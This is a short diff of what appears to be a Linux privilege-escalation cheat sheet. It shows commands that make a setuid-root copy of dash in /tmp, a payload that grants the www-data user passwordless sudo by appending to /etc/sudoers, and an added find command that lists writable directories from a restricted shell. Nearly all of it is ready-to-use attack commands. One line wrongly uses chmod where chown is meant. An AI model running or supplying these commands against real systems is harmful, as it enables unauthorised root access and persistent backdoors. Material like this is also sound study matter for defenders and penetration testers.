@@ -24,3 +24,8 @@ echo "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exp
 **4. Modifying sudoers file and provide nopasswd access for a low privileged user**
 
 echo ‘chmod 777 /etc/sudoers && echo “www-data ALL=NOPASSWD: ALL” >> /etc/sudoers && chmod 440 /etc/sudoers’ > /tmp/update
+
+**5. Command to writable directories in the restrictive shell**
+
+find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
+
